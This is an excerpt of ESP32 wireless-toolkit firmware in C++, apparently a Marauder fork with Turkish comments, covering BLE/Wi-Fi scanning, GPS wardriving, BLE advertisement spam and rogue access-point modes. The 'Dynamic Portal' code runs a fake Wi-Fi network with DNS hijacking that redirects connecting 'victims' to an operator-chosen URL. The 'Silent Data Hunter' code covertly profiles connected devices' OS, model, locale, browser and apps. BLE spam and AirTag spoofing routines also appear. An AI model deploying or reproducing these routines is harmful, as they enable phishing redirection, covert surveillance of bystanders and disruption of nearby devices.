...
static WiFiUDP hunterNbUdp; // NetBIOS (137) host tespiti icin
...
static DeviceProfile hunter_profiles[8];
static uint8_t hunter_profile_idx = 0;

static String getManufacturer(uint8_t *mac) {
  uint32_t oui = (mac[0] << 16) | (mac[1] << 8) | mac[2];
  if (mac[0] == 0x80 && mac[1] == 0xB5 && mac[2] == 0x4E)
    return "Espressif";
  // Apple
  if (mac[0] == 0x00 && mac[1] == 0x03 && mac[2] == 0x93)
    return "Apple";
  if (mac[0] == 0x34 && mac[1] == 0x15 && mac[2] == 0x9E)
    return "Apple";
  if (mac[0] == 0x00 && mac[1] == 0x1E && (mac[2] == 0xC2 || mac[2] == 0x52))
    return "Apple";
  if (mac[0] == 0x00 && (mac[1] == 0x23 || mac[1] == 0x25 || mac[1] == 0x26) &&
      mac[2] == 0x12)
    return "Apple";
  if (mac[0] == 0xAC && mac[1] == 0xBC && mac[2] == 0x32)
    return "Apple";
  // Samsung
  if (mac[0] == 0x00 && mac[1] == 0x17 && mac[2] == 0xC9)
    return "Samsung";
  if (mac[0] == 0x24 && mac[1] == 0xFC && mac[2] == 0xE5)
    return "Samsung";
  if (mac[0] == 0x38 && mac[1] == 0xAA && mac[2] == 0x3C)
    return "Samsung";
  // Xiaomi
  if (mac[0] == 0x14 && mac[1] == 0xF6 && mac[2] == 0x5A)
    return "Xiaomi";
  if (mac[0] == 0x64 && mac[1] == 0x09 && mac[2] == 0x80)
    return "Xiaomi";
  // Huawei
  if (mac[0] == 0x00 && mac[1] == 0xE0 && mac[2] == 0x4C)
    return "Huawei/Realtek";
  if (mac[0] == 0x28 && mac[1] == 0x31 && mac[2] == 0x52)
    return "Huawei";
  // Others
...
#ifndef HAS_NIMBLE_2
        AdvData.addData(std::string((char *)airtags->get(i).payload.data(),
...
#ifndef HAS_NIMBLE_2
class bluetoothDiscoveryCallback : public NimBLEAdvertisedDeviceCallbacks {
  void onResult(NimBLEAdvertisedDevice *advertisedDevice) {
    ...
    for (const auto &m : wifi_scan_obj.discovery_seen_macs) {
      if (m == macStr)
        return;
    }
    ...
    // Advanced manual parsing for 0x09 (Complete Name) and 0x08 (Short Name)
    // if standard getName() is empty or we want to be sure.
    ...
    while (offset + 2 <= payloadLen) {
      ...
      if (len == 0)
        break;
      if (offset + len + 1 > payloadLen)
        break;

      uint8_t type = payload[offset + 1];
      if (type == 0x08 || type == 0x09) {
        char buffer[33];
        size_t nameLen = (len - 1 > 32) ? 32 : len - 1;
        memcpy(buffer, &payload[offset + 2], nameLen);
        buffer[nameLen] = '\0';
        String parsedName = String(buffer);
        parsedName.trim();
    ...
    String typeStr = "BLE Cihaz";
    if (advertisedDevice->haveManufacturerData()) {
      uint8_t *mfgData =
          (uint8_t *)advertisedDevice->getManufacturerData().data();
      uint16_t mfgId = mfgData[0] | (mfgData[1] << 8);
      if (mfgId == 0x004C)
        typeStr = "Apple Cihaz";
      else if (mfgId == 0x0075)
        typeStr = "Samsung Cihaz";
      else if (mfgId == 0x0006)
        typeStr = "Microsoft";
      else if (mfgId == 0x01AB)
        typeStr = "Casio Watch";
    }
    if (advertisedDevice->haveAppearance()) {
      uint16_t app = advertisedDevice->getAppearance();
      if (app >= 0x0040 && app <= 0x0047)
        typeStr = "Smart Phone";
      else if (app >= 0x0080 && app <= 0x008F)
        typeStr = "Smart Watch";
    }

    wifi_scan_obj.discovery_seen_macs.push_back(macStr);

    // Format: [BLE - Apple Cihaz]    | MAC: XX:XX:XX:XX:XX:XX | Isim: [NAME]
    char output[160];
    snprintf(output, sizeof(output), "[BLE - %-13s] | MAC: %s | Isim: %s",
             typeStr.c_str(), macStr.c_str(), name.c_str());
...
// Serial.flush();
      ...
      if (gps_obj.getGpsModuleStatus()) {
        ...
        if (buf >= 0) {
          ...
          String wardrive_line =
              ...
              ",,[BLE]," + gps_obj.getDatetime() + ",0," +
              (String)advertisedDevice->getRSSI() + "," + gps_obj.getLat() +
              "," + gps_obj.getLon() + "," + gps_obj.getAlt() + "," +
              gps_obj.getAccuracy() + ",BLE\n";
      ...
      if (hasXuntongMfg && mfgIndex > 0) {
        uint8_t adLen =
            payLoad[mfgIndex - 1]; // length byte for this AD structure
        ...
        if (vendorStart < adEnd) {
          ...
          for (size_t k = vendorStart; k < adEnd; k++) {
            ...
            if (!started) {
              ...
              // Once started, append digits (skip separators; stop on anything
              // else)
              if (c >= '0' && c <= '9') {
                serial += c;
              } else if (c == ' ' || c == '#' || c == '-') {
      ...
      if (hasXuntongMfg && (penguin || name.length() == 0)) {
        ...
        // (struct FlockBattery { String mac; String name; String serial; int
        // rssi; uint32_t last_seen; }; etc.)
      }
          ...
          if (vendorStart < adEnd) {
            ...
            for (size_t k = vendorStart; k < adEnd; k++) {
              ...
              if (!started) {
                ...
                // Once started, append digits (skip separators; stop on
                // anything else)
                if (c >= '0' && c <= '9') {
                  serial += c;
                } else if (c == ' ' || c == '#' || c == '-') {
      ...
      int frame_check = wifi_scan_obj.update_mac_entry(
          mac_char, advertisedDevice->getRSSI(), true);
    } else if (wifi_scan_obj.currentScanMode ==
               BT_SCAN_RAYBAN) { // Filters from https://github.com/NullPxl
      bool match = false;
...
#else
class bluetoothDiscoveryCallback : public NimBLEScanCallbacks {
...
void WiFiScan::RunSetup() {
...
#ifdef HAS_PSRAM
  mac_history =
      (struct mac_addr *)ps_malloc(mac_history_len * sizeof(struct mac_addr));
#endif
  ...
  watch_models = new WatchModel[20]{
      {0x1A, "Fallback Watch"},           {0x02, "Black Watch4 Classic 40m"},
      {0x03, "White Watch4 Classic 40m"}, {0x06, "Green Watch4 44mm"},
      {0x07, "Black Watch4 40mm"},        {0x08, "White Watch4 40mm"},
      {0x09, "Gold Watch4 40mm"},         {0x0B, "French Watch4 Classic"},
      {0x0C, "Fox Watch5 44mm"},          {0x11, "Black Watch5 44mm"},
      {0x12, "Sapphire Watch5 44mm"},     {0x14, "Gold Watch5 40mm"},
      {0x15, "Black Watch5 Pro 45mm"},    {0x16, "Gray Watch5 Pro 45mm"},
      {0x17, "White Watch5 44mm"},        {0x1B, "Black Watch6 Pink 40mm"},
      {0x1C, "Gold Watch6 Gold 40mm"},    {0x1D, "Silver Watch6 Cyan 44mm"},
      {0x1E, "Black Watch6 Classic 43m"}, {0x20, "Green Watch6 Classic 43m"},
  };
...
bool WiFiScan::isMetaIdentifier(uint16_t id) {
  for (int i = 0; i < sizeof(META_IDENTIFIERS) / sizeof(META_IDENTIFIERS[0]);
       i++) {
    if (META_IDENTIFIERS[i] == id)
      return true;
  }
  return false;
}
...
bool WiFiScan::isBlockedIdentifier(uint16_t id) {
  for (int i = 0;
       i < sizeof(BLOCKED_IDENTIFIERS) / sizeof(BLOCKED_IDENTIFIERS[0]); i++) {
    if (BLOCKED_IDENTIFIERS[i] == id)
      return true;
  }
  return false;
}
...
bool WiFiScan::addSSID(String essid) {
  ...
  ssid s = {essid,
            ...
            false};
  // #else
  //   ssid s = {essid, dual_band_channels[random(0, DUAL_BAND_CHANNELS)],
  //   {random(256), random(256), random(256), random(256), random(256),
  //   random(256)}, false};
  // #endif
  ssids->add(s);
...
"")) { this->wifi_initialized = true; this->currentScanMode = WIFI_CONNECTED;
    return true;
  }
  else if (WiFi.status() == WL_CONNECTED) {
    //Serial.println(F("Already connected. Disconnecting..."));
...
void WiFiScan::StartScan(uint8_t scan_mode, uint16_t color) {
  ...
  else if (scan_mode == WIFI_SCAN_PASSIVE_DISCOVERY)
    RunPassiveDiscovery(scan_mode, color);
  else if (scan_mode == WIFI_SCAN_DYNAMIC_PORTAL)
    RunDynamicPortal(scan_mode, color);
  else if (scan_mode == WIFI_SCAN_SILENT_HUNTER)
  ...
  else if ((scan_mode == BT_SCAN_ALL) || (scan_mode == BT_SCAN_RAYBAN) ||
           (scan_mode == BT_SCAN_AIRTAG) || (scan_mode == BT_SCAN_AIRTAG_MON) ||
           (scan_mode == BT_SCAN_FLIPPER) || (scan_mode == BT_SCAN_FLOCK) ||
           (scan_mode == BT_SCAN_FLOCK_WARDRIVE) ||
           (scan_mode == BT_SCAN_ANALYZER) || (scan_mode == BT_SCAN_SIMPLE) ||
...
void WiFiScan::StopScan(uint8_t scan_mode) {
  if ((currentScanMode == WIFI_SCAN_PROBE) ||
      ...
      (currentScanMode == WIFI_SCAN_DYNAMIC_PORTAL) ||
  ...
  if ((currentScanMode == GPS_TRACKER) || (currentScanMode == GPS_POI)) {
  ...
  if ((currentScanMode == BT_SCAN_ALL) || (currentScanMode == BT_SCAN_RAYBAN) ||
...
int WiFiScan::update_mac_entry(const uint8_t mac[6], int8_t rssi, bool bt) {
  ...
  // Table full: evict something (simple policy: overwrite first tombstone or
  // oldest)
...
inline void WiFiScan::insert_mac_entry(uint32_t idx, const uint8_t mac[6],
                                       uint32_t now_ms, int8_t rssi, bool bt) {
...
void WiFiScan::evict_and_insert(const uint8_t mac[6], uint32_t now_ms) {
  ...
  // Candidate among "expired" (age > EVICT_AGE_MS): lowest frame_count, then
  // oldest
  ...
  for (uint32_t i = 0; i < mac_history_len_half; i++) {
    ...
    if (victim_any < 0 || frames < victim_any_frames ||
    ...
    if (age > EVICT_AGE_MS) {
      if (victim_expired < 0 || frames < victim_expired_frames ||
...
static inline bool is_following_candidate_light(const MacEntry &e,
                                                uint32_t now_ms,
...
uint8_t WiFiScan::build_top10_for_ui(MacEntry *out_top10, MacSortMode mode) {
  ...
  for (uint8_t k = 0; k < top_count; k++) {
    ...
    if (src >= 0) {
      ...
      out_top10[k].following =
          is_following_candidate_light(out_top10[k], now_ms, &dloc);
...
void WiFiScan::RunPortScanAll(uint8_t scan_mode, uint16_t color) {
  ...
  if ((scan_mode == WIFI_SCAN_SSH) || (scan_mode == WIFI_SCAN_TELNET) ||
      (scan_mode == WIFI_SCAN_SMTP) || (scan_mode == WIFI_SCAN_DNS) ||
      (scan_mode == WIFI_SCAN_HTTP) || (scan_mode == WIFI_SCAN_HTTPS) ||
...
void WiFiScan::RunClearSSIDs() {
  ...
  display_obj.tft.println(text_table4[12] +
                          (String)this->clearList(CLEAR_SSID));
#else
...
void WiFiScan::RunSetMac(uint8_t *mac, bool ap) {
  ...
  if (ap)
    Serial.println("Setting AP MAC: " + macToString(this->ap_mac));
  else
  ...
  if (ap)
    display_obj.tft.println("Setting AP MAC: " + macToString(this->ap_mac));
  else
    display_obj.tft.println("Setting STA MAC: " + macToString(this->sta_mac));
#endif
}

void WiFiScan::RunGenerateRandomMac(bool ap) {
  if (ap)
    generateRandomMac(this->ap_mac);
  else
    generateRandomMac(this->sta_mac);
...
void WiFiScan::writeHeader(bool poi) {
  ...
  buffer_obj.append(F("<gpx version=\"1.1\" creator=\"ESP32 GPS Logger\" "
...
bool WiFiScan::RunGPSInfo(bool tracker, bool display, bool poi) {
  ...
  if (tracker) {
    if (gps_obj.getFixStatus()) {
      this->logPoint(gps_obj.getLat(), gps_obj.getLon(), gps_obj.getAlt(),
                     gps_obj.getDatetime(), poi);
    } else
      return_val = false;
  }
...
void WiFiScan::RunAPInfo(uint16_t index, bool do_display) {
  ...
  Serial.println("   BSSID: " +
                 (String)macToString(access_points->get(index).bssid));
  ...
  Serial.println("Stations: " +
                 (String)access_points->get(index).stations->size());
  ...
  case WIFI_SECURITY_WPA3:
    Serial.println(F("WPA3"));
    break;
  case WIFI_SECURITY_WPA_WPA2_MIXED:
    Serial.println(F("WPA/WPA2 Mixed"));
    break;
  case WIFI_SECURITY_WPA2_ENTERPRISE:
    Serial.println(F("WPA2 Enterprise"));
    break;
  case WIFI_SECURITY_WPA3_ENTERPRISE:
    Serial.println(F("WPA3 Enterprise"));
    break;
  case WIFI_SECURITY_WAPI:
    Serial.println(F("WAPI"));
    break;
  default:
...
#ifdef HAS_SCREEN
  if (do_display) {
    display_obj.tft.println("   ESSID: " +
                            (String)access_points->get(index).essid);
    display_obj.tft.println(
        "   BSSID: " + (String)macToString(access_points->get(index).bssid));
    display_obj.tft.println(" Channel: " +
                            (String)access_points->get(index).channel);
    display_obj.tft.println("    RSSI: " +
                            (String)access_points->get(index).rssi);
    display_obj.tft.println("  Frames: " +
                            (String)access_points->get(index).packets);
    display_obj.tft.println("Stations: " +
                            (String)access_points->get(index).stations->size());
    display_obj.tft.println("   Brand: " +
                            (String)access_points->get(index).man);
    ...
    switch (sec) {
    case WIFI_SECURITY_OPEN:
      display_obj.tft.println(F("Open"));
      break;
    case WIFI_SECURITY_WEP:
      display_obj.tft.println(F("WEP"));
      break;
    case WIFI_SECURITY_WPA:
      display_obj.tft.println(F("WPA"));
      break;
    case WIFI_SECURITY_WPA2:
      display_obj.tft.println(F("WPA2"));
      break;
    case WIFI_SECURITY_WPA3:
      display_obj.tft.println(F("WPA3"));
      break;
    case WIFI_SECURITY_WPA_WPA2_MIXED:
      display_obj.tft.println(F("WPA/WPA2 Mixed"));
      break;
    case WIFI_SECURITY_WPA2_ENTERPRISE:
      display_obj.tft.println(F("WPA2 Enterprise"));
      break;
    case WIFI_SECURITY_WPA3_ENTERPRISE:
      display_obj.tft.println(F("WPA3 Enterprise"));
      break;
    case WIFI_SECURITY_WAPI:
      display_obj.tft.println(F("WAPI"));
      break;
    default:
      display_obj.tft.println(F("Unknown"));
      break;
    }

    /*display_obj.tft.print("     WPS: ");
    switch (wps) {
      case true:                           display_obj.tft.println(F("true"));
    break; case false: display_obj.tft.println(F("false")); break; default:
    display_obj.tft.println(F("false")); break;
    }*/
  }
#endif
...
void WiFiScan::RunPacketMonitor(uint8_t scan_mode, uint16_t color) {
  ...
  if ((scan_mode != WIFI_SCAN_PACKET_RATE) &&
    ...
    if (scan_mode == WIFI_PACKET_MONITOR)
      ...
      display_obj.tft.setTextColor(TFT_BLACK, color);
      display_obj.tft.drawCentreString("Channel Analyzer", TFT_WIDTH / 2, 16,
                                       2);
    ...
    display_obj.tft.setTextSize(1);
    display_obj.tft.setTextColor(TFT_GREEN, TFT_BLACK);
    // display_obj.setupScrollArea(display_obj.TOP_FIXED_AREA_2,
    // BOT_FIXED_AREA);
...
void WiFiScan::RunEapolScan(uint8_t scan_mode, uint16_t color) {
  ...
  display_obj.tftDrawChannelScaleButtons(set_channel, false);
  display_obj.tftDrawExitScaleButtons(false);
  display_obj.tftDrawChanHopButton(false,
                                   settings_obj.loadSetting<bool>("ChanHop"));
#endif
  //  #endif
  ...
  if (err != 0) {
    Serial.print(
        F("AP config set error, Maurauder SSID might visible : err=0x"));
    Serial.println(err, HEX);
  }
...
void WiFiScan::executeBLESpam(EBLEPayloadType type) {
...
#ifdef HAS_NIMBLE_2
    pAdvertising->setConnectableMode((random(2) == 0) ? BLE_GAP_CONN_MODE_NON
  ...
  } else if ((type == Microsoft) || (type == Google) || (type == Samsung) ||
             (type == FlipperZero)) {
    this->setBaseMacAddress(macAddr);
...
/*void WiFiScan::executeAppleJuice() { // Slower version of Sour Apple, pop up
device easier #ifdef HAS_BT uint8_t macAddr[6]; generateRandomMac(macAddr);
    this->setBaseMacAddress(macAddr);
    NimBLEDevice::init("");
    NimBLEServer *pServer = NimBLEDevice::createServer();
...
this->GetUniversalAdvertisementData(Apple);
    ...
    #ifdef HAS_NIMBLE_2
      pAdvertising->setConnectableMode((random(2) == 0) ? BLE_GAP_CONN_MODE_NON
: BLE_GAP_CONN_MODE_UND); pAdvertising->setDiscoverableMode(random(3));
      pAdvertising->setMinInterval(0x20);
      pAdvertising->setMaxInterval(0x20);
      pAdvertising->setPreferredParams(0x20, 0x20);
    #else
...
/*void WiFiScan::executeSourApple() {
  ...
  #ifdef HAS_BT
    if ((now_time - this->last_sour_apple_update > 1000) ||
(this->last_sour_apple_update == 0) || (!this->ble_initialized)) { uint8_t
macAddr[6]; generateRandomMac(macAddr); this->setBaseMacAddress(macAddr);
...
this->GetUniversalAdvertisementData(Apple);
    ...
    if ((now_time - this->last_sour_apple_update > 1000) ||
(this->last_sour_apple_update == 0)) { this->last_sour_apple_update = now_time;
      NimBLEDevice::deinit();
      this->ble_initialized = false;
    }
...
/*void WiFiScan::executeSpoofAirtag() {
    ...
    for (int i = 0; i < airtags->size(); i++) {
      if (airtags->get(i).selected) {
        ...
        //NimBLEAdvertisementData advertisementData =
getSwiftAdvertisementData(); NimBLEAdvertisementData advertisementData =
this->GetUniversalAdvertisementData(Airtag);
        pAdvertising->setAdvertisementData(advertisementData);
        pAdvertising->start();
        delay(10);
    ...
    if (scan_status > 0) {
      for (int i = 0; i < scan_status; i++) {
        ...
        if (this->currentScanMode == BT_SCAN_FLOCK_WARDRIVE) {
          for (int x = 0; x < sizeof(flock_ssid) / sizeof(this->flock_ssid[0]);
               x++) {
...
void WiFiScan::openPoiFile() {
  ...
  if (poiFile) {
    poiFile.print("<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<gpx "
                  "version=\"1.1\" creator=\"ESP32Marauder\">\n");
    poiFile.close();
    poiFileOpen = true;
    poiCount = 0;
...
void WiFiScan::closePoiFile() {
  ...
  if (poiFileOpen) {
    if (poiCount > 0) {
      ...
      // Serial.println("POI file closed: " + poiFileName + " (" +
      // String(poiCount) + " points)");
    } else {
...
void WiFiScan::tagPOI(const char *label) {
  ...
  poiFile = SD.open(poiFileName, FILE_APPEND);
  if (poiFile) {
    poiFile.print("  <wpt lat=\"" + gps_obj.getLat() + "\" lon=\"" +
                  gps_obj.getLon() + "\">\n");
  ...
  Serial.println("POI tagged: " + poiLabel + " (" + gps_obj.getLat() + ", " +
                 gps_obj.getLon() + ")");
#endif
}
...
void WiFiScan::displayWardriveStats() {
  ...
  display_obj.tft.fillRect(0, (STATUS_BAR_WIDTH * 2) + 1 + EXT_BUTTON_WIDTH,
                           TFT_WIDTH, TFT_HEIGHT - STATUS_BAR_WIDTH + 1,
                           TFT_BLACK);

#ifndef HAS_MINI_SCREEN
  display_obj.tft.setCursor(0, (STATUS_BAR_WIDTH * 4) + CHAR_WIDTH +
                                   EXT_BUTTON_WIDTH);
#else
  display_obj.tft.setCursor(0, (STATUS_BAR_WIDTH * 3) + CHAR_WIDTH +
                                   EXT_BUTTON_WIDTH);
#endif
  ...
  display_obj.tft.println(
      "Size: " +
      (String)((float)sd_obj.getFile(buffer_obj.getFileName()).size() / 1024) +
      "KB");
#endif
...
#endif
  display_obj.tft.setTextColor(TFT_GREEN, TFT_BLACK);
  if ((scan_mode != WIFI_SCAN_DETECT_FOLLOW) && (scan_mode != BT_SCAN_FLOCK)) {
    display_obj.tftDrawChannelScaleButtons(set_channel, false);
    display_obj.tftDrawExitScaleButtons(false);
    display_obj.tftDrawChanHopButton(false,
                                     settings_obj.loadSetting<bool>("ChanHop"));
...
void WiFiScan::RunSourApple(uint8_t scan_mode, uint16_t color) {
  ...
  else if (scan_mode == BT_ATTACK_APPLE_JUICE)
    display_obj.tft.drawCentreString("Apple Juice", TFT_WIDTH / 2, 16, 2);
#endif
#ifdef HAS_ILI9341
  display_obj.touchToExit();
#endif
...
void WiFiScan::RunPassiveDiscovery(uint8_t scan_mode, uint16_t color) {
  this->discovery_seen_macs.clear();

  Serial.println(F("\n--- CIHAZ KESFI (AKTIF TARAMA) ---"));
  Serial.println(F("Durdurmak icin 'q' veya 'stop' yazin."));
  Serial.println(
      F("----------------------------------------------------------------"));
...
#ifdef HAS_FULL_SCREEN
  display_obj.tft.fillRect(0, 16, TFT_WIDTH, 16, color);
  display_obj.tft.drawCentreString("Cihaz Kesfi", TFT_WIDTH / 2, 16, 2);
#ifdef HAS_ILI9341
  display_obj.touchToExit();
#endif
#endif
...
#ifndef HAS_NIMBLE_2
  pBLEScan->setAdvertisedDeviceCallbacks(new bluetoothDiscoveryCallback(),
                                         true);
#else
  pBLEScan->setScanCallbacks(new bluetoothDiscoveryCallback(), true);
#endif
  pBLEScan->setActiveScan(true); // Active scan to request names
  ...
  esp_event_loop_create_default();
#endif
  this->setWiFiMode(WIFI_MODE_NULL, passiveDiscoveryCallback);
  this->changeChannel(this->set_channel);
  this->wifi_initialized = true;
...
void WiFiScan::RunDynamicPortal(uint8_t scan_mode, uint16_t color) {
  this->currentScanMode =
      scan_mode; // Fix: Prevent immediate exit in blocking loops

  while (Serial.available())
    Serial.read(); // Temizlik
  Serial.println(F("\n======================================="));
  Serial.println(F("   DINAMIK YONLENDIRME PORTALI        "));
  Serial.println(F("======================================="));

  // 1. SSID Girisi
  Serial.println(F("[?] Olusturulacak WiFi Ismi (SSID): "));
  String portal_ssid = "";
  Serial.setTimeout(5000); // 5 saniye bekler
  ...
  while (portal_ssid == "") {
    if (Serial.available()) {
      ...
      if (portal_ssid.startsWith("#")) {
        Serial.println(F("\n[!] Komut algilandi. Portaldan cikiliyor..."));
  ...
  // 2. URL Girisi
  Serial.println(F("[?] Yonlendirilecek Hedef URL: "));
  this->dynamic_redirect_url = "";

  while (this->dynamic_redirect_url == "") {
    if (Serial.available()) {
      this->dynamic_redirect_url = Serial.readStringUntil('\n');
      this->dynamic_redirect_url.trim();

      if (this->dynamic_redirect_url.startsWith("#")) {
        Serial.println(F("\n[!] Komut algilandi. Portaldan cikiliyor..."));
        this->currentScanMode = WIFI_SCAN_OFF;
        return;
      }
      if (this->dynamic_redirect_url.length() > 0) {
        break;
      }
    }
    delay(100);
  ...
  if (!this->dynamic_redirect_url.startsWith("http")) {
    this->dynamic_redirect_url = "http://" + this->dynamic_redirect_url;
  }
  ...
  uint8_t timeout = 0;
  while (WiFi.softAPIP() == IPAddress(0, 0, 0, 0) && timeout < 50) {
    delay(100);
    timeout++;
  }
  ...
  dynamicDnsServer.stop();
  delay(500);
  dynamicDnsServer.start(53, "*", WiFi.softAPIP());
  delay(500);

  // 5. HTTP Server Yonlendirmesi
  extern AsyncWebServer server;
  server.reset();

  auto redirect_func = [this](AsyncWebServerRequest *request) {
    Serial.println(F("[!] KURBAN YAKALANDI! Istek alindi."));

    String html = "<html><head><meta name='viewport' "
                  "content='width=device-width, initial-scale=1.0'>";
    html += "<meta http-equiv='refresh' content='2; url=" +
            this->dynamic_redirect_url + "'>";
    html += "<title>Yonlendiriliyorsunuz...</title></head>";
    html +=
        "<body "
        "style='font-family:sans-serif;text-align:center;margin-top:50px;'>";
    html += "<h2>Baglanti Kuruldu</h2>";
    html += "<p>Lutfen bekleyin, hedef sayfaya yonlendiriliyorsunuz...</p>";
    html += "<p><a href='" + this->dynamic_redirect_url +
            "'>Otomatik gitmezse buraya tiklayin</a></p>";
    html += "</body></html>";

    request->send(200, "text/html", html);
  };

  server.on("/", redirect_func);
  server.onNotFound(redirect_func);
  server.begin();

  Serial.print(F("\n[RUN] "));
  Serial.print(portal_ssid);
  Serial.print(F(" yayini yapiliyor... Hedef: "));
  Serial.println(this->dynamic_redirect_url);

  this->wifi_initialized = true;
  this->setLEDMode(MODE_SNIFF);
}

void WiFiScan::RunSilentDataHunter(uint8_t scan_mode, uint16_t color) {
  this->currentScanMode = scan_mode;

  while (Serial.available())
    Serial.read();
  Serial.println(F("\n======================================="));
  Serial.println(F("   SESSIZ VERI AVCISI (DATA HUNTER)   "));
  Serial.println(F("======================================="));
  ...
  uint8_t ap_timeout = 0;
  while (WiFi.softAPIP() == IPAddress(0, 0, 0, 0) && ap_timeout < 50) {
    delay(100);
    ap_timeout++;
  }

  // 3. WiFi event: sadece MAC yakala, detayli analizi main loop'a birak
  static uint8_t *s_scan_mode_ptr = nullptr;
  s_scan_mode_ptr = &this->currentScanMode;
  static bool eventRegistered = false;

  // Modul her basladiginda profilleri temizle
  for (int i = 0; i < 8; i++) {
    memset(hunter_profiles[i].mac, 0, 6);
    hunter_profiles[i].ip = "";
    hunter_profiles[i].hostname = "";
    hunter_profiles[i].manufacturer = "";
    hunter_profiles[i].os = "";
    hunter_profiles[i].hardware = "";
    hunter_profiles[i].locale = "Bilinmiyor";
    hunter_profiles[i].browser = "Bilinmiyor";
    hunter_profiles[i].apps = "";
    hunter_profiles[i].active_app = "Yok";
    hunter_profiles[i].services = "Taraniyor...";
    hunter_profiles[i].first_seen = 0;
    hunter_profiles[i].last_activity = 0;
    hunter_profiles[i].printed = false;
    hunter_profiles[i].updated = false;
  }
  hunter_profile_idx = 0;

  if (!eventRegistered) {
    WiFi.onEvent([](WiFiEvent_t event, WiFiEventInfo_t info) {
      if (event == ARDUINO_EVENT_WIFI_AP_STACONNECTED) {
        if (s_scan_mode_ptr && *s_scan_mode_ptr == WIFI_SCAN_SILENT_HUNTER) {
          uint8_t *m = info.wifi_ap_staconnected.mac;
          bool exists = false;
          for (int i = 0; i < 8; i++) {
            if (memcmp(hunter_profiles[i].mac, m, 6) == 0) {
              exists = true;
              break;
            }
          }
          if (!exists) {
            int idx = hunter_profile_idx % 8;
            memcpy(hunter_profiles[idx].mac, m, 6);
            hunter_profiles[idx].manufacturer = getManufacturer(m);
            hunter_profiles[idx].first_seen = millis();
            hunter_profile_idx++;
          }
        }
      }
  ...
  // 4. DNS ve NetBIOS dinleyiciler
  dynamicDnsServer.stop();
  hunterDnsUdp.stop();
  hunterDnsUdp.begin(53);
  hunterNbUdp.stop();
  hunterNbUdp.begin(137);

  // 5. HTTP sunucusu: User-Agent analizi
  extern AsyncWebServer server;
  auto ua_handler = [this](AsyncWebServerRequest *request) {
    if (this->currentScanMode != WIFI_SCAN_SILENT_HUNTER)
      return;

    String client_ip = request->client()->remoteIP().toString();
    String ua =
        request->hasHeader("User-Agent") ? request->header("User-Agent") : "";

    int p_idx = -1;
    for (int i = 0; i < 8; i++) {
      if (hunter_profiles[i].ip == client_ip ||
          (hunter_profiles[i].ip == "" && hunter_profiles[i].first_seen > 0)) {
        p_idx = i;
        hunter_profiles[i].ip = client_ip;
        break;
      }
    }

    if (p_idx != -1 && ua.length() > 0) {
      hunter_profiles[p_idx].last_activity = millis();
      // 1. OS Tespiti
      if (ua.indexOf("iPhone") >= 0) {
        int idx = ua.indexOf("OS ");
        if (idx > 0) {
          int space_idx = ua.indexOf(" ", idx + 3);
          String v = (space_idx > idx + 3) ? ua.substring(idx + 3, space_idx)
                                           : ua.substring(idx + 3);
          v.replace("_", ".");
          hunter_profiles[p_idx].os = "iOS " + v;
        } else
          hunter_profiles[p_idx].os = "iPhone";
      } else if (ua.indexOf("Android") >= 0) {
        int idx = ua.indexOf("Android ");
        if (idx >= 0) {
          int sc = ua.indexOf(";", idx);
          hunter_profiles[p_idx].os =
              "Android " + ((sc > idx + 8) ? ua.substring(idx + 8, sc)
                                           : ua.substring(idx + 8, idx + 11));
          hunter_profiles[p_idx].os.trim();
        } else
          hunter_profiles[p_idx].os = "Android";
      }

      // 2. Hardware / Model Tespiti
      if (ua.indexOf("Build/") >= 0) {
        int build_idx = ua.indexOf("Build/");
        int start_idx = ua.lastIndexOf("; ", build_idx);
        if (start_idx > 0 && start_idx + 2 < build_idx) {
          hunter_profiles[p_idx].hardware =
              ua.substring(start_idx + 2, build_idx);
          hunter_profiles[p_idx].hardware.trim();
        }
      } else if (ua.indexOf("iPhone") >= 0) {
        hunter_profiles[p_idx].hardware = "Apple Device";
      }

      // 3. Dil / Locale Tespiti
      int loc_idx = ua.indexOf("; ");
      if (loc_idx > 0) {
        int loc_end = ua.indexOf(";", loc_idx + 2);
        if (loc_end > loc_idx + 2) {
          String l = ua.substring(loc_idx + 2, loc_end);
          if (l.indexOf("-") > 0 && l.length() < 10)
            hunter_profiles[p_idx].locale = l;
        }
      }

      // 4. Tarayici Tespiti
      if (ua.indexOf("Chrome/") >= 0) {
        int c_idx = ua.indexOf("Chrome/");
        hunter_profiles[p_idx].browser =
            "Chrome " + ua.substring(c_idx + 7, ua.indexOf(" ", c_idx + 7));
      } else if (ua.indexOf("Safari/") >= 0 && ua.indexOf("Version/") >= 0) {
        int v_idx = ua.indexOf("Version/");
        hunter_profiles[p_idx].browser =
            "Safari " + ua.substring(v_idx + 8, ua.indexOf(" ", v_idx + 8));
      }

      // 5. Uygulama Tespiti
      String found_app = "";
      if (ua.indexOf("WhatsApp") >= 0)
        found_app = "WhatsApp";
      else if (ua.indexOf("Instagram") >= 0)
        found_app = "Instagram";
      else if (ua.indexOf("Telegram") >= 0)
        found_app = "Telegram";
      else if (ua.indexOf("TikTok") >= 0)
        found_app = "TikTok";

      if (found_app != "" &&
          hunter_profiles[p_idx].apps.indexOf(found_app) == -1) {
        if (hunter_profiles[p_idx].apps != "")
          hunter_profiles[p_idx].apps += ", ";
        hunter_profiles[p_idx].apps += found_app;
      }
      hunter_profiles[p_idx].updated = true;
    }

    request->send(200, "text/html", "<html><body></body></html>");
  };

  server.onNotFound(ua_handler);
  server.begin();

  Serial.print(F("\n[RUN] Sessiz Avci Aktif. AG: "));
  Serial.println(portal_ssid);
  Serial.println(
      F("[~] Baglanti, User-Agent ve DNS sorgu loglari bekleniyor..."));
  Serial.println(F("[~] Durdurmak icin terminale # yazin.\n"));
...
void WiFiScan::RunBluetoothScan(uint8_t scan_mode, uint16_t color) {
  ...
  if ((scan_mode == BT_SCAN_FLOCK) || (scan_mode == BT_SCAN_FLOCK_WARDRIVE) ||
      ...
      (scan_mode == WIFI_SCAN_DETECT_FOLLOW) || (scan_mode == BT_SCAN_SIMPLE) ||
      (scan_mode == BT_SCAN_SIMPLE_TWO) || (scan_mode == BT_SCAN_ANALYZER) ||
  ...
  NimBLEDevice::init("");
  pBLEScan = NimBLEDevice::getScan(); // create new scan
  if ((scan_mode == BT_SCAN_ALL) || (scan_mode == BT_SCAN_RAYBAN) ||
      (scan_mode == BT_SCAN_AIRTAG) || (scan_mode == BT_SCAN_AIRTAG_MON) ||
      (scan_mode == BT_SCAN_FLIPPER) || (scan_mode == BT_SCAN_FLOCK) ||
      (scan_mode == BT_SCAN_FLOCK_WARDRIVE) || (scan_mode == BT_SCAN_SIMPLE) ||
      (scan_mode == BT_SCAN_SIMPLE_TWO)) {
#ifdef HAS_GPS
